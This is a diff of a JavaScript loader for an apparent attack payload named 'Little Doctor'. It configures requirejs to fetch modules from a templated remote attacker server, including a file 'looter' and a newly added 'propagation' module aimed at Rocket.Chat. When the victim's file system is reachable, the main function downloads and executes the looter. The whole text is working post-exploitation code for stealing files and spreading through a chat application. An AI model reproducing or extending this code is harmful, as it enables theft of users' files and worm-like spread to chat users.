@@ -1,5 +1,5 @@
 /*
- *  This file determines what looter modules get loaded
+ *  This file determines what looter modules get executed
  */
 
 var scheme = '__LITTLE_DOCTOR_SCHEME__://';
@@ -8,21 +8,39 @@ var server = scheme + hostname;
 
 
 requirejs.config({
+
     paths: {
         filesystem: server + '/modules/filesystem',
         utils: server + '/modules/utils',
         platform: server + '/modules/platform',
 
         // Loot modules
-        lootFiles: server + '/modules/looters/files'
+        lootFiles: server + '/modules/looters/files',
+
+        // Propagation modules
+        propagateRocketChat: server + '/modules/propagation/rocketchat',
+
     }
+
 });
 
-
+// Main entry point for little doctor
 function main() {
-    console.log('Little Doctor is examining the patient ...');
-    requirejs(['utils', 'filesystem'], function (utils, fs) {
 
+    console.log('Little Doctor is examining the patient ...');
+    requirejs(['filesystem', 'platform'], function (fs, platform) {
+        
+        fs.isFileSystemAccessbile({
+            success: function() {
+                console.log('FileSystem appears to be accessible, loading looter ...');
+                requirejs(['lootFiles'], function(lootFiles) {
+                    lootFiles.execute();
+                });
+            },
+            failure: function() {
+                console.log('FileSystem does not appear to be accessible');
+            }
+        });
 
     });
 }
